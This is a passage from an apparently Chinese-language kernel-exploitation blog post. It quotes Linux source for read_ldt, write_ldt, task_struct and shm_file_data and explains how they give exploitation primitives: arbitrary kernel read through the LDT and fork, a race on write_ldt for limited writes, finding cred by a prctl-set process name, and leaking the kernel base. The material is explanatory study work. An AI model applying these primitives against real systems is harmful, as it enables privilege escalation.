entries_size;</span><br><span class="line"><span class="type">int</span> retval;</span><br><span class="line"></span><br><span class="line">down_read(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!mm-&gt;context.ldt) &#123;</span><br><span class="line">retval = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (bytecount &gt; LDT_ENTRY_SIZE * LDT_ENTRIES)</span><br><span class="line">bytecount = LDT_ENTRY_SIZE * LDT_ENTRIES;</span><br><span class="line"></span><br><span class="line">entries_size = mm-&gt;context.ldt-&gt;nr_entries * LDT_ENTRY_SIZE;</span><br><span class="line"><span class="keyword">if</span> (entries_size &gt; bytecount)</span><br><span class="line">entries_size = bytecount;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (copy_to_user(ptr, mm-&gt;context.ldt-&gt;entries, entries_size)) &#123;</span><br><span class="line">retval = -EFAULT;</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (entries_size != bytecount) &#123;</span><br><span class="line"><span class="comment">/* Zero-fill the rest and pretend we read bytecount bytes. */</span></span><br><span class="line"><span class="keyword">if</span> (clear_user(ptr + entries_size, bytecount - entries_size)) &#123;</span><br><span class="line">retval = -EFAULT;</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">retval = bytecount;</span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line">up_read(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line"><span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中两个常量宏的定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Maximum number of LDT entries supported. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LDT_ENTRIES8192</span></span><br><span class="line"><span class="comment">/* The size of each LDT entry. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LDT_ENTRY_SIZE8</span></span><br></pre></td></tr></table></figure><p>重点看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (copy_to_user(ptr, mm-&gt;context.ldt-&gt;entries, entries_size)) &#123;</span><br><span class="line">retval = -EFAULT;</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果我们能够修改ldt结构的entries结构,便能够做到任意读</p><p>并且<u>copy_from_user和copy_to_user的返回值均是未成功copy的数量</u>,可以以此判断是否命中</p><h4 id="大范围搜索内存"><a href="#大范围搜索内存" class="headerlink" title="大范围搜索内存"></a>大范围搜索内存</h4><p>不过就算read_ldt能够帮助我们搜索内存,但是仍然无法完全避免<code>hardened usercopy</code>的影响</p><p>但观察 fork 系统调用的源码，我们可以发现如下执行链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sys_fork()</span><br><span class="line">    kernel_clone()</span><br><span class="line">        copy_process()</span><br><span class="line">            copy_mm()</span><br><span class="line">                dup_mm()</span><br><span class="line">                    dup_mmap()</span><br><span class="line">                        arch_dup_mmap()</span><br><span class="line">                            ldt_dup_context()</span><br></pre></td></tr></table></figure><p>ldt_dup_context() 定义于 <code>arch/x86/kernel/ldt.c</code> 中，逻辑如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Called on fork from arch_dup_mmap(). Just copy the current LDT state,</span></span><br><span class="line"><span class="comment"> * the new task is not running, so nothing can be installed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">ldt_dup_context</span><span class="params">(<span class="keyword">struct</span> mm_struct *old_mm, <span class="keyword">struct</span> mm_struct *mm)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_mm-&gt;context.ldt-&gt;entries,</span><br><span class="line">           new_ldt-&gt;nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>new_ldt-&gt;nr_entries</code>由<code>old_ldt-&gt;nr_entries</code>赋值</p><p>在这里会通过 memcpy 将父进程的 ldt-&gt;entries 拷贝给子进程，<strong>是完全处在内核中的操作</strong>,因此能够绕过<code>hardened usercopy</code>的检查</p><p>当父进程设置目标地址后,再打开子进程,便会将目标地址处的内容复制到子进程的ldt中,之后再使用read_ldt便能够直接读取</p><h3 id="write-ldt"><a href="#write-ldt" class="headerlink" title="write_ldt"></a>write_ldt</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">write_ldt</span><span class="params">(<span class="type">void</span> __user *ptr, <span class="type">unsigned</span> <span class="type">long</span> bytecount, <span class="type">int</span> oldmode)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> *<span class="title">new_ldt</span>, *<span class="title">old_ldt</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> old_nr_entries, new_nr_entries;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">ldt_info</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> <span class="title">ldt</span>;</span></span><br><span class="line"><span class="type">int</span> error;</span><br><span class="line"></span><br><span class="line">error = -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (bytecount != <span class="keyword">sizeof</span>(ldt_info))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">error = -EFAULT;</span><br><span class="line"><span class="keyword">if</span> (copy_from_user(&amp;ldt_info, ptr, <span class="keyword">sizeof</span>(ldt_info)))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">error = -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (ldt_info.entry_number &gt;= LDT_ENTRIES)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"><span class="keyword">if</span> (ldt_info.contents == <span class="number">3</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (oldmode)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"><span class="keyword">if</span> (ldt_info.seg_not_present == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((oldmode &amp;&amp; !ldt_info.base_addr &amp;&amp; !ldt_info.limit) ||</span><br><span class="line">    LDT_empty(&amp;ldt_info)) &#123;</span><br><span class="line"><span class="comment">/* The user wants to clear the entry. */</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;ldt, <span class="number">0</span>, <span class="keyword">sizeof</span>(ldt));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (!IS_ENABLED(CONFIG_X86_16BIT) &amp;&amp; !ldt_info.seg_32bit) &#123;</span><br><span class="line">error = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fill_ldt(&amp;ldt, &amp;ldt_info);</span><br><span class="line"><span class="keyword">if</span> (oldmode)</span><br><span class="line">ldt.avl = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (down_write_killable(&amp;mm-&gt;context.ldt_usr_sem))</span><br><span class="line"><span class="keyword">return</span> -EINTR;</span><br><span class="line"></span><br><span class="line">old_ldt       = mm-&gt;context.ldt;</span><br><span class="line">old_nr_entries = old_ldt ? old_ldt-&gt;nr_entries : <span class="number">0</span>;</span><br><span class="line">new_nr_entries = max(ldt_info.entry_number + <span class="number">1</span>, old_nr_entries);</span><br><span class="line"></span><br><span class="line">error = -ENOMEM;</span><br><span class="line">new_ldt = alloc_ldt_struct(new_nr_entries);</span><br><span class="line"><span class="keyword">if</span> (!new_ldt)</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (old_ldt)</span><br><span class="line"><span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</span><br><span class="line">finalize_ldt_struct(new_ldt);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If we are using PTI, map the new LDT into the userspace pagetables.</span></span><br><span class="line"><span class="comment"> * If there is already an LDT, use the other slot so that other CPUs</span></span><br><span class="line"><span class="comment"> * will continue to use the old LDT until install_ldt() switches</span></span><br><span class="line"><span class="comment"> * them over to the new LDT.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">error = map_ldt_struct(mm, new_ldt, old_ldt ? !old_ldt-&gt;slot : <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (error) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This only can fail for the first LDT setup. If an LDT is</span></span><br><span class="line"><span class="comment"> * already installed then the PTE page is already</span></span><br><span class="line"><span class="comment"> * populated. Mop up a half populated page table.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!WARN_ON_ONCE(old_ldt))</span><br><span class="line">free_ldt_pgtables(mm);</span><br><span class="line">free_ldt_struct(new_ldt);</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">install_ldt(mm, new_ldt);</span><br><span class="line">unmap_ldt_struct(mm, old_ldt);</span><br><span class="line">free_ldt_struct(old_ldt);</span><br><span class="line">error = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line">up_write(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line">out:</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们主要关注</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">new_ldt = alloc_ldt_struct(new_nr_entries);</span><br><span class="line"><span class="keyword">if</span> (!new_ldt)</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line"><span class="keyword">if</span> (old_ldt)</span><br><span class="line"><span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line">new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</span><br></pre></td></tr></table></figure><p><code>new_ldt</code>是新申请出来的object,在alloc之后memcpy之前有一个窗口期,若是我么能够在这期间竞争修改<code>new_ldt-&gt;entries</code>,那么便能够做到任意写,不过这个窗口期比较短,实际运用成功率较低</p><p>但我们还可以注意到<code>new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</code>这一句,memcpy函数拷贝的长度是<code>old_nr_entries * LDT_ENTRY_SIZE</code></p><p>这个数据量相对较大,那么如果能够在memcpy函数执行的过程中通过竞争修改<code>new_ldt-&gt;entries</code>,也能够做到小范围的任意写</p><p>至于任意写的值其实也并不是完全受我们控制,不过可以根据我们传入的结构体,在一定程度上进行控制(具体可以看这个函数的完整流程)</p><p>我们<u>需要传入的结构体</u>的定义如下,新的ldt一定程度上受这个结构体控制,可以根据要求更改</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Note on 64bit base and limit is ignored and you cannot set DS/ES/CS</span></span><br><span class="line"><span class="comment"> * not to the default values if you still want to do syscalls. This</span></span><br><span class="line"><span class="comment"> * call is more for 32bit mode therefore.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  entry_number;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  base_addr;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  limit;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  seg_32bit:<span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  contents:<span class="number">2</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  read_exec_only:<span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  limit_in_pages:<span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  seg_not_present:<span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  useable:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __x86_64__</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Because this bit is not present in 32-bit user code, user</span></span><br><span class="line"><span class="comment"> * programs can pass uninitialized values here.  Therefore, in</span></span><br><span class="line"><span class="comment"> * any context in which a user_desc comes from a 32-bit program,</span></span><br><span class="line"><span class="comment"> * the kernel must act as though lm == 0, regardless of the</span></span><br><span class="line"><span class="comment"> * actual value.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  lm:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="内存搜索cred"><a href="#内存搜索cred" class="headerlink" title="内存搜索cred"></a>内存搜索cred</h2><p>在task_struct中有一个成员comm</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Process credentials: */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Tracer&#x27;s credentials at attach: */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>        *<span class="title">ptracer_cred</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>        *<span class="title">real_cred</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>        *<span class="title">cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="comment">/* Cached requested key. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>            *<span class="title">cached_requested_key</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * executable name, excluding path.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * - normally initialized setup_new_exec()</span></span><br><span class="line"><span class="comment">     * - access it with [gs]et_task_comm()</span></span><br><span class="line"><span class="comment">     * - lock it with task_lock()</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">char</span>                comm[TASK_COMM_LEN];</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nameidata</span>        *<span class="title">nameidata</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其是该进程的名字且其位置刚好在 cred 附近，我们只需要从 <code>page_offset_base</code> 开始找当前进程的名字便能够找到当前进程的 task_struct</p><p>而通过prctl系统调用能够修改进程的名字</p><p><code>prctl(PR_SET_NAME,&quot;new_process_name&quot;)</code></p><p>在具有内存搜索能力之后,只需要找到这个便能快速确定cred地址</p><h2 id="逆向边角料"><a href="#逆向边角料" class="headerlink" title="逆向边角料"></a>逆向边角料</h2><p>很多时候由于gcc优化或者别的什么原因</p><p>kmalloc会变成<code>kmem_cache_alloc(kmalloc_caches[5], 6291648LL);</code>这样</p><p>可以按照<code>/mm/slab_common.c</code>文件中的下列信息比对,获取申请大小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">kmalloc_info_struct</span> <span class="title">kmalloc_info</span>[] __<span class="title">initconst</span> =</span> &#123;</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">0</span>, <span class="number">0</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">96</span>, <span class="number">96</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">192</span>, <span class="number">192</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">8</span>, <span class="number">8</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">16</span>, <span class="number">16</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">32</span>, <span class="number">32</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">64</span>, <span class="number">64</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">128</span>, <span class="number">128</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">256</span>, <span class="number">256</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">512</span>, <span class="number">512</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">1024</span>, <span class="number">1</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">2048</span>, <span class="number">2</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">4096</span>, <span class="number">4</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">8192</span>, <span class="number">8</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">16384</span>, <span class="number">16</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">32768</span>, <span class="number">32</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">65536</span>, <span class="number">64</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">131072</span>, <span class="number">128</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">262144</span>, <span class="number">256</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">524288</span>, <span class="number">512</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">1048576</span>, <span class="number">1</span>M),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">2097152</span>, <span class="number">2</span>M)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="shm-file-data"><a href="#shm-file-data" class="headerlink" title="shm_file_data"></a>shm_file_data</h2><p>这个结构体主要是用于泄露内核基址的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shm_file_data</span> &#123;</span></span><br><span class="line"><span class="type">int</span> id;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">vm_operations_struct</span> *<span class="title">vm_ops</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>大小为<code>0x20</code>,从kmalloc-32中分配</p><p>其中的 ns字段和vm_ops字段皆指向内核的<code>.text</code>段中</p><p>file字段位于内核线性映射区,能够泄露内核堆地址</p><p>有四个相关函数<code>shmget</code>、<code>shmat</code>、<code>shmctl</code>、<code>shmdt</code></p><h3 id="分配"><a href="#分配" class="headerlink" title="分配"></a>分配</h3><p>使用 <code>shmget</code> 系统调用可以获得一个共享内存对象，随后要使用 <code>shmat</code> 系统调用将共享内存对象映射到进程的地址空间</p><p><strong>shmget</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(shmget, <span class="type">key_t</span>, key, <span class="type">size_t</span>, size, <span class="type">int</span>, shmflg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> ksys_shmget(key, size, shmflg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一般这样调用,key可以是任意整型,返回一个shmid</p><p><code>shm_id = shmget(114514, 0x1000, SHM_R | SHM_W | IPC_CREAT);</code></p><p><strong>shmat</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(shmat, <span class="type">int</span>, shmid, <span class="type">char</span> __user *, shmaddr, <span class="type">int</span>, shmflg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> ret;</span><br><span class="line"><span class="type">long</span> err;</span><br><span class="line"></span><br><span class="line">err = do_shmat(shmid, shmaddr, shmflg, &amp;ret, SHMLBA);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">force_successful_syscall_return();</span><br><span class="line"><span class="keyword">return</span> (<span class="type">long</span>)ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在do_shmat中会分配一个shm_file_data结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">do_shmat</span><span class="params">(<span class="type">int</span> shmid, <span class="type">char</span> __user *shmaddr, <span class="type">int</span> shmflg,</span></span><br><span class="line"><span class="params">          ulong *raddr, <span class="type">unsigned</span> <span class="type">long</span> shmlba)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">shm_file_data</span> *<span class="title">sfd</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    sfd = kzalloc(<span class="keyword">sizeof</span>(*sfd), GFP_KERNEL);</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    file-&gt;private_data = sfd;</span><br></pre></td></tr></table></figure><h3 id="释放"><a href="#释放" class="headerlink" title="释放"></a>释放</h3><p><code>shmdt</code> 系统调用用以断开与共享内存对象的连接，观察其源码，发现其会调用 <code>ksys_shmdt()</code> 函数，注意到如下调用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SYS_shmdt()</span><br><span class="line">    ksys_shmdt()</span><br><span class="line">        do_munmap()</span><br><span class="line">            remove_vma_list()</span><br><span class="line">                remove_vma()</span><br></pre></td></tr></table></figure><p>其中有着这样一条代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> vm_area_struct *<span class="title function_">remove_vma</span><span class="params">(<span class="keyword">struct</span> vm_area_struct *vma)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">next</span> =</span> vma-&gt;vm_next;</span><br><span class="line"></span><br><span class="line">    might_sleep();</span><br><span class="line">    <span 